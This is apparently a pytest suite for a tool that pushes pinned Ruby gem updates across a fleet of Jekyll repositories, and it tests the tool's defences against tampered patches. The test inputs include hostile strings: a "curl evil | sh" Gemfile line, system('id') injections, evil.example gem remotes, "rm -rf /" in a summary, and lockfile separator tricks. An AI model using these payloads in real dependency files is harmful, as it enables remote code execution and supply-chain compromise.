import json
import os
import types

import pytest

import fleet_align_gems as al

MATRIX_TEXT = open(os.path.join(os.path.dirname(al.__file__), "versions.yml"), encoding="utf-8").read()
TOKEN = "ghp_SECRETTOKEN123"
GIT_REMOTE = "https://github.com/BrightSoftwares/blogpost-tools.git"
LOCK = f"""GIT
  remote: {GIT_REMOTE}
  revision: abc123
  tag: jekyll-obsidian-wikilinks-v2.1.1
  specs:
    jekyll-obsidian-wikilinks (2.1.1)

GEM
  remote: https://rubygems.org/
  specs:
    i18n (1.14.7)
    ffi (1.16.3)
    jekyll (4.3.4)
    jekyll-timeago (0.13.1)
    rexml (3.4.5)

PLATFORMS
  ruby

DEPENDENCIES
  ffi (= 1.16.3)
  jekyll (~> 4.3.4)
  jekyll-timeago (~> 0.13.1)

BUNDLED WITH
   2.5.0
"""
GEMFILE = """source 'https://rubygems.org'
gem 'jekyll', '~> 4.3.4'
gem 'jekyll-timeago', '~> 0.13.1', require: false
gem 'ffi', '= 1.16.3'
"""
M = al.load_matrix(MATRIX_TEXT)
ALLOWED = {"a/site", "brightsoftwares/corporate-website"}
LATEST = {"ffi": "1.18.0", "jekyll-timeago": "1.2.0"}


@pytest.fixture(autouse=True)
def no_ambient_secrets(monkeypatch):
    for k in al.SECRET_ENV:
        monkeypatch.delenv(k, raising=False)


def apply_update(lock, gemfile, gems):
    for gem in gems:
        pin = [l for l in gemfile.splitlines() if l.startswith(f"gem '{gem}', '= ")]
        ver = pin[-1].split("'= ")[1].split("'")[0] if pin else LATEST.get(gem, "9.9.9")
        lock = "\n".join(f"    {gem} ({ver})" if l.startswith(f"    {gem} (") else l for l in lock.split("\n"))
        lock = lock.replace(f"  {gem} (= 1.16.3)", f"  {gem} (= {ver})").replace(f"  {gem} (~> 0.13.1)", f"  {gem} (= {ver})")
    return lock


# ------------------------------------------------------------------ matrix + pure checks
def test_matrix_parses_with_allow_sources():
    assert M["gems"]["jekyll"] == "4.3.4" and GIT_REMOTE in M["allow_sources"]
    with pytest.raises(ValueError):
        al.load_matrix('gems:\n  "bad name": "1.0"\n')


def test_parse_lock_platforms_prereleases_and_order():
    assert al.parse_lock(LOCK)["ffi"] == "1.16.3"
    assert al.parse_lock("GEM\n  specs:\n    ffi (1.17.4-x86_64-linux)\n    foo (1.0.0.rc1)\n") == {"ffi": "1.17.4", "foo": "1.0.0.rc1"}
    assert al.vkey("1.0.0.rc1") < al.vkey("1.0.0") < al.vkey("1.0.1") and al.vkey("1.10.0") > al.vkey("1.9.9")


def test_plan_updates_below_leaves_ahead_ignores_absent():
    p = al.plan(al.parse_lock(LOCK), M)
    assert p["update"] == ["ffi", "jekyll-timeago"] and p["ahead"] == {"rexml": "3.4.5"} and "webrick" not in p["ok"]


def test_pin_gemfile_rewrites_constraint_and_appends_transitive():
    out = al.pin_gemfile(GEMFILE, {"ffi": "1.17.4", "jekyll-timeago": "1.1.0", "rexml": "3.4.4"})
    assert "gem 'ffi', '= 1.17.4'" in out and "gem 'jekyll-timeago', '= 1.1.0', require: false" in out
    assert "gem 'rexml', '= 3.4.4'" in out and "gem 'jekyll', '~> 4.3.4'" in out
    assert al.gemfile_problems(GEMFILE, out, M) == []


# ------------------------------------------------------------------ blocker 1: text validation of the patch
def good_patch():
    gf = al.pin_gemfile(GEMFILE, {"ffi": "1.17.4", "jekyll-timeago": "1.1.0"})
    return {"repo": "a/site", "branch": "main", "summary": "ffi 1.16.3->1.17.4, jekyll-timeago 0.13.1->1.1.0", "ahead": "",
            "before_gemfile": GEMFILE, "before_lock": LOCK, "after_gemfile": gf,
            "after_lock": apply_update(LOCK, gf, ["ffi", "jekyll-timeago"])}


def test_good_patch_validates():
    assert al.patch_problems(good_patch(), M, ALLOWED) == []


@pytest.mark.parametrize("mutate,needle", [
    (lambda p: p.update(after_lock=p["after_lock"].replace("https://rubygems.org/", "https://evil.example/")), "GEM remote"),
    (lambda p: p.update(after_lock=p["after_lock"].replace("revision: abc123", "revision: evil999")), "source list"),
    (lambda p: p.update(after_lock=p["after_lock"].replace("PLATFORMS\n  ruby", "PLATFORMS\n  ruby\n  java")), "platforms changed"),
    (lambda p: p.update(after_lock=p["after_lock"] + "\nPATH\n  remote: .\n  specs:\n    y (1.0.0)\n"), "PATH"),
    (lambda p: p.update(after_lock=p["after_lock"].replace("  jekyll (~> 4.3.4)", "  jekyll (~> 4.3.4)\n  evil (>= 0)")), "DEPENDENCIES entry changed outside"),
    (lambda p: p.update(after_lock=p["after_lock"].replace("    i18n (1.14.7)", "    i18n (1.15.0)\n    newdep (1.0.0)")), "outside the matrix"),
    (lambda p: p.update(after_gemfile=p["after_gemfile"] + "system('curl evil | sh')\n"), "Gemfile change outside the matrix"),
    (lambda p: p.update(after_gemfile=p["after_gemfile"].replace("= 1.17.4", "= 9.9.9")), "not pinned to the matrix version"),
    (lambda p: p.update(repo="-evil/x"), "invalid repo"),
    (lambda p: p.pop("after_lock"), "malformed"),
])
def test_patch_text_validation_refuses(mutate, needle):
    p = good_patch()
    mutate(p)
    assert any(needle in x for x in al.patch_problems(p, M, ALLOWED)), al.patch_problems(p, M, ALLOWED)


def test_unallowlisted_existing_git_source_is_refused():
    lock = LOCK.replace(GIT_REMOTE, "https://github.com/evil/gem.git")
    assert any("not allowlisted" in x for x in al.sources_problems(lock, M))
    assert al.sources_problems(LOCK, M) == []


# ------------------------------------------------------------------ blocker 1: build phase holds no token
def make_tree(tmp_path, lock=LOCK, gemfile=GEMFILE):
    tree = tmp_path / "tree"
    tree.mkdir()
    (tree / "Gemfile.lock").write_text(lock)
    (tree / "Gemfile").write_text(gemfile)
    return str(tree)


class BundleRunner:
    def __init__(self, build_rc=0, update_rc=0, mutate=None):
        self.calls, self.build_rc, self.update_rc, self.mutate = [], build_rc, update_rc, mutate

    def __call__(self, cmd, cwd=None, capture_output=True, text=True, env=None):
        self.calls.append((cmd, env))
        rc, out = 0, ""
        if cmd[:2] == ["bundle", "update"]:
            rc = self.update_rc
            gf = open(os.path.join(cwd, "Gemfile")).read()
            lock = apply_update(open(os.path.join(cwd, "Gemfile.lock")).read(), gf, [g for g in cmd[2:] if not g.startswith("--")])
            if self.mutate:
                lock = self.mutate(lock)
            open(os.path.join(cwd, "Gemfile.lock"), "w").write(lock)
            out = f"bad https://u:p@x {TOKEN}" if rc else ""
        elif cmd[:3] == ["bundle", "exec", "jekyll"]:
            rc, out = self.build_rc, (f"err {TOKEN} https://u:p@x" if self.build_rc else "")
        return types.SimpleNamespace(returncode=rc, stdout=out, stderr="")


def test_build_refuses_to_run_when_a_secret_is_in_the_environment(tmp_path, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    with pytest.raises(RuntimeError, match="refuses to run with secrets"):
        al.build_repo("a/site", "main", make_tree(tmp_path), M, runner=BundleRunner())
    with pytest.raises(SystemExit):
        al.main(["--phase", "build", "--in", str(tmp_path), "--patches", str(tmp_path / "p")])


def test_build_env_is_an_allowlist(tmp_path, monkeypatch):
    for k in ("GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "SOME_RANDOM_VAR"):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "x")
    r = BundleRunner()
    kind, patch = al.build_repo("a/site", "main", make_tree(tmp_path), M, runner=r)
    assert kind == "PATCH"
    for cmd, env in r.calls:
        assert set(env) == {"PATH", "LANG", "HOME", "TMPDIR", "BUNDLE_APP_CONFIG", "BUNDLE_USER_HOME"}
        assert env["HOME"] == env["TMPDIR"] and "AWS_SECRET_ACCESS_KEY" not in env
    assert r.calls[0][0] == ["bundle", "update", "ffi", "jekyll-timeago", "--conservative"]
    assert al.patch_problems(patch, M, ALLOWED) == []
    with pytest.raises(ValueError):
        al.build_env("/tmp/x", passthrough=("GITHUB_TOKEN",))


def test_build_outputs_only_a_patch_and_failures_are_redacted_and_patchless(tmp_path):
    kind, msg = al.build_repo("a/site", "main", make_tree(tmp_path), M, runner=BundleRunner(build_rc=1))
    assert kind == "MSG" and "FAIL jekyll build" in msg and "u:p@" not in msg
    kind, msg = al.build_repo("a/site", "main", make_tree(tmp_path / "b" if (tmp_path / "b").mkdir() is None else tmp_path), M,
                              runner=BundleRunner(update_rc=1))
    assert kind == "MSG" and "u:p@" not in msg


def test_build_refuses_foreign_lock_changes(tmp_path):
    kind, msg = al.build_repo("a/site", "main", make_tree(tmp_path), M,
                              runner=BundleRunner(mutate=lambda l: l.replace("https://rubygems.org/", "https://evil.example/")))
    assert kind == "MSG" and "GEM remote" in msg


# ------------------------------------------------------------------ blocker 2: symlinks, pre-existing sources
def test_symlinked_gemfile_or_lock_is_refused(tmp_path):
    tree = make_tree(tmp_path)
    secret = tmp_path / "secret"
    secret.write_text("TOKEN-LIKE")
    os.remove(os.path.join(tree, "Gemfile"))
    os.symlink(secret, os.path.join(tree, "Gemfile"))
    kind, msg = al.build_repo("a/site", "main", tree, M, runner=BundleRunner())
    assert kind == "MSG" and "symlink" in msg
    with pytest.raises(ValueError):
        al.read_regular(os.path.join(tree, "Gemfile"), tree)
    with pytest.raises(ValueError):
        al.write_regular(os.path.join(tree, "Gemfile"), tree, "x")


def test_build_fails_on_unallowlisted_existing_git_section(tmp_path):
    kind, msg = al.build_repo("a/site", "main", make_tree(tmp_path, lock=LOCK.replace(GIT_REMOTE, "https://github.com/evil/g.git")),
                              M, runner=BundleRunner())
    assert kind == "MSG" and "not allowlisted" in msg


# ------------------------------------------------------------------ push phase: hardening
class GitRunner:
    def __init__(self, patch=None, work_branch=False, unreviewed="", merge_rc=0, stale=False, symlink=False):
        self.calls, self.patch, self.work_branch = [], patch or good_patch(), work_branch
        self.unreviewed, self.merge_rc, self.stale, self.symlink = unreviewed, merge_rc, stale, symlink

    @property
    def cmds(self):
        return [c for c, _ in self.calls]

    def ran(self, word):
        return any(word in c for c in self.cmds)

    def env_of(self, word):
        return [e for c, e in self.calls if word in c][0]

    def __call__(self, cmd, cwd=None, capture_output=True, text=True, env=None):
        self.calls.append((cmd, env))
        rc, out = 0, ""
        sub = cmd[3:] if cmd[:3] == ["git", "-c", "core.hooksPath=/dev/null"] else cmd[1:]
        if sub and sub[0] == "clone":
            dest = sub[-1]
            os.makedirs(dest, exist_ok=True)
            open(os.path.join(dest, "Gemfile"), "w").write("CHANGED" if self.stale else self.patch["before_gemfile"])
            if self.symlink:
                os.symlink("/etc/passwd", os.path.join(dest, "Gemfile.lock"))
            else:
                open(os.path.join(dest, "Gemfile.lock"), "w").write(self.patch["before_lock"])
        elif sub and sub[0] == "fetch":
            rc = 0 if self.work_branch else 1
        elif sub and sub[0] == "log":
            out = self.unreviewed
        elif "merge" in sub and "--abort" not in sub:
            rc = self.merge_rc
        return types.SimpleNamespace(returncode=rc, stdout=out, stderr="")


def push(tmp_path, runner, apply=True, **kw):
    return al.push_patch(runner.patch, M, str(tmp_path), apply, TOKEN, runner=runner, trailer="T", allowed=ALLOWED, **kw)


def test_push_hardening_hooks_config_scope_and_redirects(tmp_path):
    r = GitRunner()
    out = push(tmp_path, r)
    assert out.startswith("a/site: DONE")
    assert all(c[:3] == ["git", "-c", "core.hooksPath=/dev/null"] for c in r.cmds)
    assert not any(TOKEN in a for c in r.cmds for a in c)
    for sub in ("clone", "fetch", "push"):
        env = r.env_of(sub)
        assert env["GIT_CONFIG_GLOBAL"] == "/dev/null" and env["GIT_CONFIG_NOSYSTEM"] == "1"
        assert env["GIT_CONFIG_KEY_0"] == "http.https://github.com/.extraheader"
        assert env["GIT_CONFIG_KEY_1"] == "http.followRedirects" and env["GIT_CONFIG_VALUE_1"] == "false"
    for c, env in r.calls:  # local calls carry no credential at all
        if not any(w in c for w in ("clone", "fetch", "push")):
            assert "GIT_CONFIG_VALUE_0" not in env and env["GIT_CONFIG_GLOBAL"] == "/dev/null"
    pushes = [c for c in r.cmds if "push" in c]
    assert pushes == [["git", "-c", "core.hooksPath=/dev/null", "push", "-q", "origin", "HEAD:claude/automated-work"]]
    assert open(os.path.join(tmp_path, "a__site-push", "Gemfile.lock")).read() == r.patch["after_lock"]


def test_push_dry_run_validates_text_only_no_clone_no_token_needed(tmp_path):
    r = GitRunner()
    out = al.push_patch(r.patch, M, str(tmp_path), False, "", runner=r, allowed=ALLOWED)
    assert "WOULD push" in out and r.calls == []
    bad = good_patch()
    bad["after_lock"] = bad["after_lock"].replace("https://rubygems.org/", "https://evil.example/")
    assert "patch rejected" in al.push_patch(bad, M, str(tmp_path), True, TOKEN, runner=r, allowed=ALLOWED) and r.calls == []


def test_push_refuses_stale_patch_and_symlinked_lock_in_fresh_clone(tmp_path):
    r = GitRunner(stale=True)
    assert "stale patch" in push(tmp_path, r) and not r.ran("push")
    r2 = GitRunner(symlink=True)
    assert "symlink" in push(tmp_path / "s", r2) and not r2.ran("push")


def test_existing_work_branch_merge_reset_and_conflict(tmp_path):
    r = GitRunner(work_branch=True, unreviewed="abc123 earlier work\n")
    assert push(tmp_path, r).startswith("a/site: DONE") and r.ran("merge")
    r2 = GitRunner(work_branch=True, unreviewed="")
    push(tmp_path / "b", r2)
    assert not r2.ran("merge")
    r3 = GitRunner(work_branch=True, unreviewed="abc x\n", merge_rc=1)
    out = push(tmp_path / "c", r3)
    assert "cannot merge" in out and r3.ran("--abort") and not r3.ran("push")


def test_pr_body_lists_unreviewed_commits_and_open_pr_is_reused(tmp_path):
    class GH:
        def __init__(self, prs):
            self.prs, self.posted = prs, None

        def get(self, path):
            return 200, self.prs

        def request(self, method, path, body):
            self.posted = body
            return 201, {"html_url": "https://x/pr/1"}, {}

    gh = GH([])
    out = push(tmp_path, GitRunner(work_branch=True, unreviewed="abc123 earlier work\n"), gh=gh)
    assert "opened PR" in out and "abc123 earlier work" in gh.posted["body"]
    gh2 = GH([{"html_url": "https://x/pr/9"}])
    assert "PR already open" in push(tmp_path / "z", GitRunner(), gh=gh2) and gh2.posted is None


# ------------------------------------------------------------------ fetch phase
class FetchRunner:
    def __init__(self):
        self.calls = []

    def __call__(self, cmd, cwd=None, capture_output=True, text=True, env=None):
        self.calls.append((cmd, env))
        tree = cmd[-1]
        os.makedirs(os.path.join(tree, ".git", "hooks"))
        open(os.path.join(tree, ".git", "config"), "w").write("[core]\n")
        open(os.path.join(tree, "Gemfile"), "w").write(GEMFILE)
        return types.SimpleNamespace(returncode=0, stdout="", stderr="")


def test_fetch_hands_over_plain_tree_without_git_dir_and_token_not_in_argv(tmp_path):
    r = FetchRunner()
    assert "fetched" in al.fetch_repo("a/site", "main", str(tmp_path), TOKEN, runner=r)
    base = tmp_path / "a__site"
    assert (base / "tree" / "Gemfile").exists() and not (base / "tree" / ".git").exists()
    assert json.load(open(base / "meta.json")) == {"repo": "a/site", "branch": "main"}
    cmd, env = r.calls[0]
    assert cmd[:3] == ["git", "-c", "core.hooksPath=/dev/null"] and "https://github.com/a/site.git" in cmd
    assert not any(TOKEN in a for a in cmd) and env["GIT_CONFIG_GLOBAL"] == "/dev/null"
    assert "invalid" in al.fetch_repo("a/site", "--upload-pack=x", str(tmp_path), TOKEN, runner=r)


# ------------------------------------------------------------------ output + misc minors
def test_safe_line_escapes_control_chars_and_workflow_commands():
    assert al.safe_line("::set-output name=x::1").startswith("\\::")
    assert "\n" not in al.safe_line("a\nb\x1b[31m") and "\\x0a" in al.safe_line("a\nb")
    assert TOKEN not in al.safe_line(f"x {TOKEN} https://u:p@h", TOKEN) and "u:p@" not in al.safe_line("https://u:p@h")


def test_names_validated_and_main_rejects_bad_input(tmp_path):
    assert al.valid_name("main") and not al.valid_name("-rf") and not al.valid_name("a/../b")
    assert al.valid_repo("a/site") and not al.valid_repo("-a/site") and not al.valid_repo("a/b/c")
    with pytest.raises(SystemExit):
        al.main(["--phase", "push", "--patches", str(tmp_path), "--only", "-x"])
    with pytest.raises(SystemExit):
        al.main(["--phase", "push"])


FLEET_REPO = "BrightSoftwares/corporate-website"  # first entry of fleet_repos.txt
OTHER_FLEET_REPO = "BrightSoftwares/modabyflora-corporate"


def fleet_patch(**over):
    p = good_patch()
    p["repo"] = FLEET_REPO
    p.update(over)
    return p


def test_main_push_dry_run_end_to_end_and_isolation(tmp_path, capsys, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    monkeypatch.delenv("GH_TOKEN", raising=False)
    (tmp_path / al.patch_filename(FLEET_REPO)).write_text(json.dumps(fleet_patch()))
    (tmp_path / "broken.json").write_text("{not json")
    bad = fleet_patch(repo=OTHER_FLEET_REPO)
    bad["after_gemfile"] += "system('x')\n"
    (tmp_path / al.patch_filename(OTHER_FLEET_REPO)).write_text(json.dumps(bad))
    # the failing repos no longer hide behind exit 0, and they never stop the good one
    assert al.main(["--phase", "push", "--patches", str(tmp_path)]) == 1
    out = capsys.readouterr().out
    assert "WOULD push" in out and "unreadable patch" in out and "patch rejected" in out
    assert al.safe_call("a/x", lambda: 1 / 0).startswith("a/x: ERROR ZeroDivisionError")


def test_main_push_exits_zero_when_every_repo_is_ok(tmp_path, capsys, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    (tmp_path / al.patch_filename(FLEET_REPO)).write_text(json.dumps(fleet_patch()))
    assert al.main(["--phase", "push", "--patches", str(tmp_path)]) == 0
    assert "WOULD push" in capsys.readouterr().out


def test_is_failure_only_flags_error_and_fail_lines():
    assert al.is_failure("a/x: ERROR clone failed") and al.is_failure("a/x: FAIL jekyll build (...) - no patch")
    for ok in ("a/x: OK, lock already on matrix", "a/x: SKIP (no committed Gemfile and Gemfile.lock)",
               "a/x: WOULD push to claude/automated-work: ffi 1->2 (patch valid)", "a/x: DONE ffi 1->2; pushed",
               "a/x: patch ready: ffi 1->2"):
        assert not al.is_failure(ok), ok


def test_main_build_exits_nonzero_when_a_repo_fails_and_zero_when_all_ok(tmp_path, capsys, monkeypatch):
    for k in al.SECRET_ENV:
        monkeypatch.delenv(k, raising=False)
    indir = tmp_path / "in"

    def tree(name, lock):
        base = indir / name
        (base / "tree").mkdir(parents=True)
        (base / "meta.json").write_text(json.dumps({"repo": f"a/{name}", "branch": "main"}))
        (base / "tree" / "Gemfile").write_text(GEMFILE)
        (base / "tree" / "Gemfile.lock").write_text(lock)

    tree("skipme", "x")
    (indir / "skipme" / "tree" / "Gemfile").unlink()  # no Gemfile -> SKIP, not a failure
    assert al.main(["--phase", "build", "--in", str(indir), "--patches", str(tmp_path / "p")]) == 0
    assert "SKIP" in capsys.readouterr().out
    tree("evil", LOCK.replace("https://rubygems.org/", "https://evil.example/"))
    assert al.main(["--phase", "build", "--in", str(indir), "--patches", str(tmp_path / "p")]) == 1
    assert "a/evil: FAIL" in capsys.readouterr().out


def test_patch_for_a_repo_outside_the_fleet_list_is_rejected():
    allowed = al.fleet_repo_set(open(os.path.join(os.path.dirname(al.__file__), "fleet_repos.txt"), encoding="utf-8").read())
    assert FLEET_REPO.lower() in allowed
    assert al.patch_problems(fleet_patch(), M, allowed) == []
    assert al.patch_problems(fleet_patch(repo=FLEET_REPO.upper()), M, allowed) == []  # GitHub names are case-insensitive
    assert al.patch_problems(fleet_patch(repo="evil/exfil"), M, allowed) == ["repo not in fleet_repos.txt"]
    msg = al.push_patch(fleet_patch(repo="evil/exfil"), M, "/nonexistent", False, "", allowed=allowed)
    assert "FAIL patch rejected" in msg and "fleet_repos.txt" in msg


def test_main_push_rejects_a_patch_for_a_repo_not_in_the_fleet_list(tmp_path, capsys, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    (tmp_path / "a__site.json").write_text(json.dumps(good_patch()))  # repo a/site is not in fleet_repos.txt
    assert al.main(["--phase", "push", "--patches", str(tmp_path)]) == 1
    out = capsys.readouterr().out
    assert "a/site: FAIL patch rejected" in out and "WOULD push" not in out


@pytest.mark.parametrize("mutate", [
    lambda p: p.update(summary="x\n::set-output name=a::b"),
    lambda p: p.update(summary="ffi 1.0->2.0; rm -rf /"),
    lambda p: p.update(summary="ffi 1.0->2.0" * 100),
    lambda p: p.update(summary=["ffi"]),
    lambda p: p.pop("summary"),
    lambda p: p.update(ahead="rogue text"),
    lambda p: p.update(ahead=al.AHEAD_PREFIX + "x\n::error::y"),
    lambda p: p.update(ahead=al.AHEAD_PREFIX + "x" * 2000),
    lambda p: p.update(ahead=42),
])
def test_patch_summary_and_ahead_shape_is_validated(mutate):
    p = fleet_patch()
    mutate(p)
    assert al.patch_problems(p, M, ALLOWED) in (["malformed patch"], ["invalid summary in patch"], ["invalid ahead note in patch"])


def test_patch_with_valid_ahead_note_and_multi_gem_summary_is_accepted():
    p = fleet_patch(summary="ffi 1.16.3->1.17.4, jekyll-timeago 0.13.1->1.1.0", ahead=al.AHEAD_PREFIX + "{'jekyll': '4.4.1'}")
    assert al.patch_problems(p, M, ALLOWED) == []


def test_non_dict_patch_is_malformed_not_a_crash():
    assert al.patch_problems(["x"], M, ALLOWED) == ["malformed patch"]
    assert al.safe_call("n", al.push_patch, ["x"], M, "/nonexistent", False, "", allowed=ALLOWED).startswith("?: FAIL patch rejected")


# ------------------------------------------------------------------ regenerate, do not trust (Gemfile + summary)
@pytest.mark.parametrize("extra", [
    "gem 'ffi', '= 1.17.4'; system('id')\n",
    "gem 'ffi', '= 1.17.4', git: 'https://evil.example/x.git'\n",
    "gem 'jekyll-timeago', '= 1.1.0' # ok\nsystem('id')\n",
])
def test_gemfile_exploit_lines_that_pass_name_and_pin_checks_are_rejected(extra):
    p = good_patch()
    p["after_gemfile"] += extra
    assert al.patch_problems(p, M, ALLOWED), "exploit Gemfile line accepted"


def test_gemfile_must_be_byte_identical_to_the_regenerated_pin():
    p = good_patch()
    p["after_gemfile"] = p["after_gemfile"].replace("'= 1.17.4'", "'= 1.17.4' ")  # harmless-looking whitespace
    assert any("regenerated pin" in x for x in al.patch_problems(p, M, ALLOWED))


def test_summary_must_match_the_lock_diff_and_commit_uses_it():
    p = good_patch()
    p["summary"] = "ffi 1.16.3->1.17.4"  # well-formed but drops a gem the lock really changed
    assert any("summary does not match" in x for x in al.patch_problems(p, M, ALLOWED))
    p = good_patch()
    p["after_lock"] = p["after_lock"].replace("    rexml (3.4.5)", "    rexml (3.4.6)")
    assert any("lock changes" in x or "outside the matrix" in x for x in al.patch_problems(p, M, ALLOWED))


# ------------------------------------------------------------------ ASCII-only names, required allowlist
def test_unicode_lookalike_repo_names_are_rejected():
    kelvin = "BrightSoftwares/\u212aelvin"  # KELVIN SIGN lower-cases to ASCII 'k'
    assert not al.valid_repo(kelvin) and not al.valid_name("m\u00e4in")
    with pytest.raises(ValueError):
        al.parse_repo_list(kelvin)
    p = good_patch()
    p["repo"] = "a/s\u212aite"
    assert al.patch_problems(p, M, {"a/site"}) == ["invalid repo or branch in patch"]


def test_allowed_is_a_required_argument():
    with pytest.raises(TypeError):
        al.push_patch(good_patch(), M, "/nonexistent", False, "")
    with pytest.raises(TypeError):
        al.patch_problems(good_patch(), M)


# ------------------------------------------------------------------ failure reporting
def test_pushed_commit_without_a_pr_is_a_failure_not_done(tmp_path):
    class NoPR:
        def get(self, path):
            return 200, []

        def request(self, method, path, body=None):
            return 403, {}, {}

    msg = push(tmp_path, GitRunner(), gh=NoPR())
    assert "FAIL" in msg and "PR creation failed" in msg and "DONE" not in msg and al.is_failure(msg)


def test_fetch_phase_exit_code_and_unlisted_inaccessible_repo(tmp_path, capsys, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    repos = tmp_path / "repos.txt"
    repos.write_text("a/gone\n")
    monkeypatch.setattr(al.GitHub, "from_env", classmethod(lambda cls: object()))
    monkeypatch.setattr(al, "default_branch", lambda gh, repo: None)
    argv = ["--phase", "fetch", "--repos", str(repos), "--out", str(tmp_path / "w")]
    assert al.main(argv) == 1
    assert "a/gone: ERROR not accessible" in capsys.readouterr().out
    monkeypatch.setattr(al, "default_branch", lambda gh, repo: "main")
    monkeypatch.setattr(al, "fetch_repo", lambda *a, **k: "a/gone: fetched")
    assert al.main(argv) == 0
    monkeypatch.setattr(al, "fetch_repo", lambda *a, **k: "a/gone: ERROR clone failed")
    assert al.main(argv) == 1


def test_build_reports_invalid_or_unreadable_meta_json(tmp_path, capsys, monkeypatch):
    for k in al.SECRET_ENV:
        monkeypatch.delenv(k, raising=False)
    indir = tmp_path / "in"
    (indir / "nometa").mkdir(parents=True)
    (indir / "badrepo").mkdir()
    (indir / "badrepo" / "meta.json").write_text(json.dumps({"repo": "-evil/x", "branch": "main"}))
    (indir / "badjson").mkdir()
    (indir / "badjson" / "meta.json").write_text("{nope")
    assert al.main(["--phase", "build", "--in", str(indir), "--patches", str(tmp_path / "p")]) == 1
    out = capsys.readouterr().out
    assert "nometa: ERROR" in out and "badrepo: ERROR" in out and "badjson: ERROR" in out


# ------------------------------------------------------------------ round 3: lock grammar, spec comparison, matrix version
def with_after_lock(**edits):
    """good_patch whose after_lock has `old -> new` text edits applied and whose summary is re-derived from the locks."""
    p = good_patch()
    for old, new in edits.values():
        assert old in p["after_lock"], old
        p["after_lock"] = p["after_lock"].replace(old, new, 1)
    b, a = al.parse_lock(p["before_lock"]), al.parse_lock(p["after_lock"])
    p["summary"] = ", ".join(f"{g} {b[g]}->{a.get(g)}" for g in al.plan(b, M)["update"])
    return p


def assert_rejected(p, needle=None):
    problems = al.patch_problems(p, M, ALLOWED)
    assert problems, "patch was accepted"
    if needle:
        assert any(needle in x for x in problems), problems


def test_whitespace_line_hiding_a_second_gem_remote_is_rejected():
    # Bundler 4.0.18 LockfileParser reads these as ONE Rubygems source with remotes evil + rubygems.org
    p = with_after_lock(e=("  remote: https://rubygems.org/\n", "  remote: https://rubygems.org/\n \n  CHECKSUMS\n  remote: https://evil.example/\n"))
    assert_rejected(p, "evil.example")


@pytest.mark.parametrize("sep", ["\r", "\x0b", "\x0c", "\x1c", "\x85", "\u2028"])
def test_separator_characters_python_splits_on_but_ruby_does_not_are_rejected(sep):
    p = with_after_lock(e=("  remote: https://rubygems.org/\n", f"  remote: https://rubygems.org/{sep}  remote: https://evil.example/\n"))
    assert_rejected(p)


def test_extra_remote_in_any_section_and_trailing_space_are_rejected():
    assert_rejected(with_after_lock(e=("PLATFORMS\n  ruby", "PLATFORMS\n  remote: https://evil.example/\n  ruby")))
    assert_rejected(with_after_lock(e=("  remote: https://rubygems.org/\n", "  remote: https://rubygems.org/ \n")))
    assert_rejected(with_after_lock(e=("\n\nPLATFORMS", "\n \nPLATFORMS")))  # whitespace-only separator line
    assert al.grammar_problems(LOCK) == []  # the real-shaped fixture is clean


def test_invisible_gem_with_letter_version_and_hidden_dependency_is_rejected():
    # Bundler reads `evilgem (1.0.1a)`; the old parse_lock did not, and GEM blocks were never compared
    p = with_after_lock(a=("    jekyll (4.3.4)\n", "    jekyll (4.3.4)\n      evilgem (>= 0)\n"),
                        b=("    rexml (3.4.5)\n", "    evilgem (1.0.1a)\n    rexml (3.4.5)\n"))
    assert_rejected(p)
    assert al.parse_lock("GEM\n  specs:\n    evilgem (1.0.1a)\n") == {"evilgem": "1.0.1a"}
    assert any("outside the matrix" in x for x in al.lock_problems(good_patch()["before_lock"], p["after_lock"], M)[0])


def test_unchanged_gem_dependency_lines_must_be_identical():
    p = with_after_lock(a=("    jekyll-obsidian-wikilinks (2.1.1)\n", "    jekyll-obsidian-wikilinks (2.1.1)\n      rexml (>= 0)\n"))
    assert_rejected(p, "outside the matrix update")


def test_updated_gem_must_land_on_the_matrix_version_even_if_summary_matches():
    p = with_after_lock(v=("    ffi (1.17.4)", "    ffi (1.99.0)"))
    p["after_gemfile"] = p["after_gemfile"]  # Gemfile still pinned to the matrix version
    assert_rejected(p, "not on the matrix version")


def test_unicode_digit_versions_are_rejected_and_do_not_parse():
    p = good_patch()
    p["after_lock"] = p["after_lock"].replace("ffi (1.17.4)", "ffi (1.17.\u0664)")
    assert_rejected(p)
    assert al.parse_lock("GEM\n  specs:\n    ffi (1.17.\u0664)\n") == {}
    assert not al.SUMMARY_RE.fullmatch("ffi 1.16.3->1.17.\u0664")


def test_matrix_gem_removed_from_the_lock_is_a_message_not_a_keyerror():
    p = good_patch()
    p["after_lock"] = p["after_lock"].replace("    ffi (1.17.4)\n", "")
    problems = al.patch_problems(p, M, ALLOWED)
    assert problems and any("ffi" in x for x in problems)


def test_real_bundler_lock_shapes_pass_the_grammar():
    lock = """GEM
  remote: https://rubygems.org/
  specs:
    ffi (1.17.4-x86_64-linux-gnu)
    jekyll (4.3.4)
      i18n (>= 1.6, < 2)

PLATFORMS
  ruby
  x86_64-linux

DEPENDENCIES
  jekyll (~> 4.3.4)
  jekyll-obsidian-wikilinks!
  tzinfo-data

CHECKSUMS
  ffi (1.17.4-x86_64-linux-gnu) sha256=00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff
  jekyll-obsidian-wikilinks (2.1.1)

RUBY VERSION
  ruby 3.3.6

BUNDLED WITH
  4.0.18
"""
    assert al.grammar_problems(lock) == []
    assert al.grammar_problems(lock.replace("BUNDLED WITH\n  4.0.18", "BUNDLED WITH\n   2.5.0")) == []


# ------------------------------------------------------------------ round 3: binding, manifests
def test_patch_is_bound_to_its_repo_file_name_and_fleet_branch(tmp_path, capsys, monkeypatch):
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    branches = {"brightsoftwares/corporate-website": None, "brightsoftwares/modabyflora-corporate": "stable"}
    good = fleet_patch()
    assert al.binding_problem(al.patch_filename(FLEET_REPO), good, branches) is None
    assert "file name" in al.binding_problem("other__repo.json", good, branches)
    forged = fleet_patch(repo=OTHER_FLEET_REPO, branch="refs/heads/other")
    assert "fleet branch" in al.binding_problem(al.patch_filename(OTHER_FLEET_REPO), forged, branches)
